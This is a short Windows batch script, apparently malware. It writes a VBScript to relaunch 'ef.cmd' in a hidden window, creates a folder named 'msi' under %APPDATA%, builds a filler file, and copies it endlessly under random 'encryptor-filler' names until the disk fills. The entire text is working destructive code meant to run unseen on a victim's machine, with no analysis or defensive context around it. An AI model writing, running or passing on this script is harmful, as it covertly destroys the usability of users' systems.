if exist "Wscript.vbs" (
  del Wscript.vbs
  goto an
) else (
  goto createSc
)
:createSc
set WsStr=Set WshShell = CreateObject("WScript.Shell") 
  echo %WsStr% >>Wscript.vbs
  echo WshShell.Run "cmd.exe /c ef.cmd", 0, false >>Wscript.vbs
  start Wscript.vbs
  exit /b
:an
setlocal enabledelayedexpansion
cd %APPDATA%
if exist "msi" (
 cd msi
) else (
  mkdir msi
  cd msi
)
:main
set count=0
set fat=fat%random%.txt
call :call && call :call  
:cp
set /a count+=1
set file1=encryptor-filler%random%d%random%f%random%a%random%%count%.bsl
copy /Y %fat% %file1% >nul
goto cp
:call
for /l %%i in (1,1,1200) do ( call :createfat )
:createfat
echo  >>%fat%